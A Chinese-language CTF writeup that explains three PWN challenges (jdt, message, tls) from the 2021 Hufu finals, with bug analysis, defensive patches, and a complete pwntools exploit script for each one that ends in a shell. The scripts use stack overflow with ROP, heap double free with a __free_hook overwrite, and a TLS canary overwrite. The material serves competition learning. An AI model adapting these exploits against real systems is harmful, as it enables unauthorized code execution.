# 2021虎符网络安全技能大赛决赛 PWN Writeup

阅读量 **222388**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2021-05-14 15:30:11

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p3.ssl.qhimg.com/t0100aef53c2742b73c.jpg)

## jdt

一道简单的栈溢出 + 菜单题，难度主要在于结构分析上

###  程序一览

我们先还原一下结构信息

![](https://p5.ssl.qhimg.com/t01f15eea26de1132f3.png)

看一下菜单信息

![](https://p2.ssl.qhimg.com/t01e78326a78be6e217.png)

只看菜单内容可能会以为这是一道堆题，但实际上并不是。

![](https://p4.ssl.qhimg.com/t0145f49a10ace6b97c.png)

在修复完结构体的数据后，可以很快速的发现这里存在一个溢出，问题就在于判定范围的时候没有考虑到临界情况，从而导致了溢出0x50个字节。

![](https://p2.ssl.qhimg.com/t01ef9b9f0ebb48080c.png)

这道题是存在canary的，但是我们并不需要考虑如何绕过canary，因为我们这里的溢出很特别，我们可以直接修改canary之后的内容来写ROP，就可以绕过canary的检测了。我们可以指定修改某一部分的内容。

###  防御

把所有的

    
    
    if(idx > 0x10)
    

换成

    
    
    if(idx > 0xF)
    

###  攻击

这里我泄露pie之后利用plt表中的printf来输出栈上的地址来泄露得到libc基址，接着二次利用one_gadget来getshell。

**EXP**

    
    
    from pwn import *
    r = process('./jdt')
    # r = remote('172.16.9.2', 9006)
    context.log_level = "debug"
    elf = ELF('./jdt')
    
    def debug(addr=0, PIE=True):
        if PIE:
            text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(r.pid)).readlines()[1], 16)
            print ("breakpoint_addr --> " + hex(text_base + addr))
            gdb.attach(r, 'b *{}'.format(hex(text_base + addr)))
        else:
            gdb.attach(r, "b *{}".format(hex(addr)))
    
    def choice(idx):
        r.sendlineafter("Choice: ", str(idx))
    
    def add(price=1, author="wjh", name="wjh", description="wjh"):
        choice(1)
        r.sendlineafter("Price?", str(price))
        r.sendafter("Author?", author)
        r.sendafter("name?", author)
        r.sendafter("Description?", description)
    
    def show(idx):
        choice(3)
        r.sendlineafter("idx?", str(idx))
    
    def edit(idx, content):
        choice(2)
        r.sendlineafter("idx?", str(idx))
        choice(3)  # Name
        r.send(content[:0x10])
        choice(2)
        r.sendlineafter("idx?", str(idx))
        choice(2)
        r.send(content[0x10:0x20])
        choice(2)
        r.sendlineafter("idx?", str(idx))
        choice(4)
        r.send(content[0x20:0x40])
    
    def exit_loop():
        choice(5)
    
    for i in range(16):
        add()
    show(16)
    r.recvuntil('Price:')
    pie_base = int(r.recvuntil('\n'), 10) - 0x8c0
    log.success("pie: " + hex(pie_base))
    elf.address = pie_base
    stack_addr = u64(r.recvuntil('\x7f')[-6:].ljust(8, '\x00'))
    log.success("stack: " + hex(stack_addr))
    pop_rdi_addr = pie_base + 0x00000000000011e3
    main_addr = pie_base + 0x0000000000000AFA
    payload = 'b' * 8 + p64(pop_rdi_addr) + p64(stack_addr + 0x98) + p64(elf.plt['printf']) + p64(main_addr)
    edit(16, payload.ljust(0x40, '\x00'))
    exit_loop()
    # leak libc
    libc_base = u64(r.recvuntil('\x7f')[-6:].ljust(8, '\x00')) - 0x3da80b
    log.success("libc:" + hex(libc_base))
    one = [0x4527a, 0xf0364, 0xf1207]
    one_gadget = libc_base + one[0]
    #getshell
    for i in range(16):
        add()
    payload2 = 'b' * 8 + p64(one_gadget)
    edit(16, payload2.ljust(0x40, '\x00'))
    exit_loop()
    r.interactive()
    

## message

###  程序一览

**checksec**

![](https://p0.ssl.qhimg.com/t015bbb4f2bee9098c5.png)

保护全开

**程序内容**

这道题就是典型的glibc2.23下的菜单 +
堆题，只不过披上了C++的外壳，但是漏洞部分主要还是使用C的malloc函数和free函数所产生的，比赛的时候被C++所吓唬住了，所以比赛开始后很久才去仔细研究这道题，导致丢失了大量的分数。

![](https://p1.ssl.qhimg.com/t01221dcd6ded651fa2.png)

这道题目由于是C++所编写的，伪代码中充斥着各种命名空间的信息，非常的长，所以为了方便分析，拿到题目后先在IDA中把结构体设置好。

![](https://p3.ssl.qhimg.com/t01067936f9ad180ed2.png)

###  分析漏洞

通过观察IDA左侧的Functions
window，我发现了malloc和free函数，所以我猜测这道题应该是一个堆题，而堆题的大部分漏洞都是存在于free函数附近的操作，所以我顺着菜单的信息来找到了
**Remove Message** 这个功能

![](https://p0.ssl.qhimg.com/t01fa6b7a70ac89b31a.png)

我们可以发现这里在free之后，只对了pool[idx]进行置0，而没有对pool[idx]->message_ptr和pool[idx]->phone_ptr进行置0。而观察其他代码可以发现，程序对于某个index所指向的Message结构体是否有效的判定依赖于对
**pool[idx]是否为0的判定**
，如果为0则意味着这个Message结构体未被使用或被释放，由此我们可以想到，是否有一处地方可以把释放掉的Message结构体重新申请回来，使得
**pool[idx] != 0，**
而且此时这个结构体上有pool[idx]->message_ptr和pool[idx]->phone_ptr这两个残留指针，如果这两个残留指针没有被覆盖，我们就可以构成UAF或者double
free。

![](https://p5.ssl.qhimg.com/t01735bcf944eab9e46.png)

所以我把找漏洞的重心都放在了Add Message这里，发现了这里代码中存在问题，问题在于对Message
size检验不通过后，没有做对这块错误堆块结构的后续处理（free、置0等等），而是直接进入了下一次菜单逻辑，而且在这个过程中message_ptr的残留指针没有被覆盖。

这样就导致我们可以利用这个功能重新申请到之前被释放的Message结构（fastbins->0x30），并且这个结构上保留着已被释放的message_ptr的地址（phone的地址在这之前被覆盖，所以无法利用）。

###  防御

这道题的问题其实蛮多的，但是在比赛过程中，我们需要一种最快速的修复方法。这道题我在比赛中的修复方法是修复了在Remove
Message中的问题，在这个过程中没有把message_ptr的地址置0，我们只需要patch程序使其在Remove
Message的过程中把message_ptr的地址置0即可。

不过在在这部分的空间，远不足以让我们来把message_ptr的地址置0，我们需要有另一块地址来写入我们的汇编代码，然后让代码在执行过程中jmp过去执行即可。

在IDA中我们就可以发现 **.eh_frame** 这部分空间满足这个要求，并且这部分空间具有可执行权限，关于 **.eh_frame**
的介绍可以参照[https://stackoverflow.com/questions/26300819/why-gcc-compiled-c-program-needs-eh-frame-section](https://stackoverflow.com/questions/26300819/why-gcc-compiled-c-program-needs-eh-frame-section?fileGuid=hhycXd8TVTJjWhQh)

![](https://p2.ssl.qhimg.com/t01c4e29d3dee91f4fe.png)

###  攻击

对于这道题来说，我认为防御是比较容易的，但是攻击较难。

**泄露堆地址**

利用fastbins链上的残余指针即可获得堆地址，不过需要注意一般操作会造成残余指针会覆盖，需要结合UAF的漏洞来泄露，具体操作可以看exp。

**构成UAF**

首先我们要想办法来构成UAF，根据上面的分析，我们只需要在free之后再申请回来并在程序中输入一个错误的message size即可构成UAF。

但是这个方法在实际过程中需要注意堆块的fd指针，因为这个位置同时也是message结构体的message_size的内容。

在edit
Message过程中，程序会根据message_size的大小来读取Message内容，而如果在fastbins只有一个堆块的时候取出这个堆块，那么就会使得fd
= 0，即message_size为0，这样就不能够构成UAF了。

所以我这里为了方便，直接用double free(a -> b -> a)这种方法来进行UAF，并控制fd指针。

###

**提升到任意内存读写**

通过上面的分析可以得知这道题是保护全开的，所以我们只能考虑修改fd到堆那篇区域的某个地方。而这个程序通过了一个Message结构体来储存其他堆块的指针，所以我们只需要修改fd到这个Message
结构体并劫持即可。

先在Message结构体之上伪造一个和要修改fd的堆块相近的size，我这里用的是0x71（为了绕过glibc对fastbin申请堆块时候的检测），然后修改fd指向到那里，这样就可以成功申请得到这个部分的Message结构体，同时我们就相当于得到了任意读写权限，因为那块地方存放了其他的堆块指针。这种操作似乎叫做
**House of Spirit** 。

**Leak libc**

但是拥有了任意读写之后，我们还是无处可打，正是因为我没有没有libc base

![](https://p5.ssl.qhimg.com/t010ecc0068996ecfc6.png)

这道题的难点就在于如何leak
libc，我们可控的申请堆块只有使用calloc申请的message堆块，因为是使用calloc申请的，所以利用此来得到堆块的残留信息，并且这个堆块的申请范围也限制在了0x40到0x78之间，这使得我们无法直接的使用unsorted
bin来leak libc。

这里我的思路是，覆盖Message结构体中的message_ptr成员，改到一处我们伪造size在unsorted
bin范围中的堆块，这里选择的是0x91。

![](https://p0.ssl.qhimg.com/t01d4a26899d99cd726.png)

调试后发现，实际上这里存放phone的0x21空间，很适合用于伪造成0x91，并且这部分内容和我们之后用calloc申请的message_ptr相接，那部分的内容大小正好是0x71，这样的话也可以绕过glibc
prev检测（0x20 + 0x70 = 0x90）。

![](https://p4.ssl.qhimg.com/t019a13ab4551612ebd.png)

图中的第二行为伪造的0x71 size，用于fd指向并申请得到权限。

下面的0x21 size，通过前面申请得到的来修改为0x91。

其他数据按照原样还原即可（因为用calloc申请得到，数据都会被清0）

修改后再free一次就可以成功让这个堆块到unsortedbin中去，接着再把这个Message结构体申请回来，由于申请过程中，导致unsorted
bin堆块被分割，所以我们需要通过调试修正指针指向unsorted bin堆块位置，再进行一次show即可leak libc。

**GetShell**

leak
libc之后，我们再利用这个任意读写往__free_hook写system的地址，同时在随缘写一处sh\x00，最后free即可成功getshell。

**EXP**

    
    
    from pwn import *
    r = process('./Message')
    context.log_level = "debug"
    
    def choice(idx):
        r.sendlineafter("Your Choice: ", str(idx))
    
    def add(time, phone, size, message='x'):
        choice(1)
        r.sendlineafter("time: ", str(time))
        r.sendlineafter("phone number: ", str(phone))
        r.sendlineafter("size: ", str(size))
        if 0x3F < size <= 0x78:
            r.sendlineafter("message:", message)
    
    def edit_message(idx, message):
        choice(2)
        r.sendlineafter("idx:", str(idx))
        r.sendlineafter("New Message: ", message)
    
    def delete(idx):
        choice(5)
        r.sendlineafter("idx:", str(idx))
    
    def show(idx):
        choice(6)
        r.sendlineafter("idx:", str(idx))
    
    # leak heapbase
    add('0', '0', 0x68, 'a')  # 0
    add('1', '1', 0x68, 'a')  # 1
    delete(0)
    delete(1)
    add('\x71', '0', 0)  # 0 get 1
    add('1', '1', 0)  # 1 get 0
    show(0)
    r.recvuntil('Message: ')
    heap_base = u64(r.recvuntil('\n', drop=True)[-6:].ljust(8, '\x00')) - 0x11c60
    log.success("heap_base:\t" + hex(heap_base))
    # double free & hijack fd
    delete(1)
    add('1', '1', 0x68, p64(heap_base + 0x11ce0))  # 1
    add('2', '2', 0x68, 'a')  # 2
    add('3', '3', 0x68, 'a')  # 3
    add('4', '4', 0x68,
        p64(heap_base + 0x11d30) + p64(heap_base + 0x11d10) + p64(0) + p64(0x91) + p64(0) * 3 + p64(0x71))  # 4
    # into unsorted bin -> leak libc
    delete(0)
    add('sh\x00', 'sh\x00', 0x48, 'sh\x00')  # 0
    edit_message(4, p64(heap_base + 0x11d30) + p64(heap_base + 0x11d80))
    show(0)
    libc_base = u64(r.recvuntil('\x7f')[-6:].ljust(8, '\x00')) - 0x3c4b78
    log.success("libc_base:\t" + hex(libc_base))
    # getshell
    free_hook_addr = libc_base + 0x3c67a8
    system_addr = libc_base + 0x453a0
    edit_message(4, p64(free_hook_addr) + p64(heap_base + 0x11d30))
    edit_message(0, p64(system_addr))
    delete(0)
    r.interactive()
    

## tls

一种绕过canary的思路

###  程序一览

![](https://p4.ssl.qhimg.com/t017ba80f177b834bcc.png)

题目通过 **pthread_create** 来创建了一个线程

线程代码如下

![](https://p0.ssl.qhimg.com/t012b8ee2d44833e1ce.png)

一眼可以看出有一个三次机会的栈上任意写8字节，和最后的一个栈溢出。

题目存在canary，也就是要让我们利用三次机会的栈上任意写8字节来绕过canary保护。

使用 **pthread_create**
所创建的线程，glibc在TLS上的实现是存在问题的。由于栈是由高地址向低地址增长，而TLS是在内存的高地址上进行了初始化，使用这个函数所创建的线程用于栈的空间是在内存的低地址，并且距离这个TLS的空间距离很近，距离小于一页，这使得我们可以直接通过很长的溢出修改到TLS上canary的值，从而覆盖绕过canary
check。

###  防御

我最初的时候修复考虑到的是直接修复下面0x100长度的栈溢出，但是却被提示为服务异常。

![](https://p2.ssl.qhimg.com/t01632509a5798d3210.png)

接下来的修复，我就考虑在输入pos之后对pos进行一个check，如果pos大于0x30范围就直接进入check down环节，这样修复就成功了。

不得不说这个服务异常的check函数挺严格的，居然直接修栈溢出的方法都不行。

###  攻击

**绕过canary**

这道题的任意溢出正好符合这道题的条件，我这里直接用这个溢出来修改TLS上canary的值为’a’ *
8（和溢出数据中的canary一致）即可绕过canary。

**如何定位到TLS上的canary？**

![](https://p3.ssl.qhimg.com/t012c625000e26f4c07.png)

如图所示的命令，在fs[0x28]的位置，实际上就是在TLS中储存canary的位置，我们可以调试并确定偏移大小。

**Leak libc**

这道题没有开PIE，可以多次利用，所以泄露libc的难度不大，我这里分享一种我的开启PIE也可以打通的方法

这种方法的本质，就是部分覆盖返回指针，使其指向到调用本函数之前的位置，这样再返回的时候，又会重新执行call函数再次调用这个函数。

![](https://p5.ssl.qhimg.com/t01eb6f16fde982241b.png)

这里在fs:[0x640]中存放的指针就是本函数的指针

所以，我们就借助了程序中输出名称的功能

![](https://p3.ssl.qhimg.com/t01610e9c8088ac587f.png)

成功的泄露出了libc的地址（因为返回地址就是libc上的某个位置，而溢出的内容中不存在\x00，就全部都连续起来了）

**EXP**

    
    
    from pwn import *
    
    r = process('./tls2')
    #r = remote('172.16.9.2', 9004)
    context.log_level = "debug"
    
    def choice(idx):
        r.sendlineafter("choice: ", str(idx))
    
    
    def edit(n, data):
        choice(1)
        r.sendlineafter("Please input pos: ", str(n))
        choice(2)
        r.sendlineafter("number: ", str(u64(data.ljust(8, '\x00'))))
    
    def exit_loop():
        choice(4)
    
    #change tls canary
    r.sendlineafter("How many? ", "1")
    r.sendlineafter("num_list[0] = ", "1")
    edit(0x13b, 'a' * 8)
    
    #leak libc
    exit_loop()
    payload = 'a' * 56 + 'a' * 8 + 'b' * 8 + '\xb2'
    r.sendafter('name? ', payload)
    libc_base = u64(r.recvuntil('\x7f')[-6:].ljust(8, '\x00')) - 0x7536b2
    log.success("libc_base: " + hex(libc_base))
    
    
    #getshell
    r.sendlineafter("How many? ", "1")
    r.sendlineafter("num_list[0] = ", "1")
    exit_loop()
    one = [0x4527a, 0xf0364, 0xf1207]
    one_gadget = libc_base + one[0]
    payload2 = 'a' * 56 + 'a' * 8 + 'b' * 8 + p64(one_gadget)
    r.sendafter('name? ', payload2)
    
    r.interactive()
    

## 总结

这样的PWN题难度在线上赛中其实算是比较低的，不过听说Web的题目质量应该还是很高的。但是由于是第一次参加线下AWDP比赛，比赛过程中也很紧张，修复题目漏洞和写exp速度都太慢了些，导致在比赛中直接被打爆了（
~~就当去旅游了吧~~ ），通过这次比赛遇到了很多大佬，也学到了很多AWDP的知识，真希望明年还能再来打一次！（
~~大概还有三次机会吧，希望能拿一次奖）~~

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **wjh** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/240507](/post/id/240507)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [Pwn](/tag/Pwn)
  * [CTF](/tag/CTF)

 **+1** __5赞

 __收藏

![](https://p4.ssl.qhimg.com/t0162586615c462960c.png) wjh

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

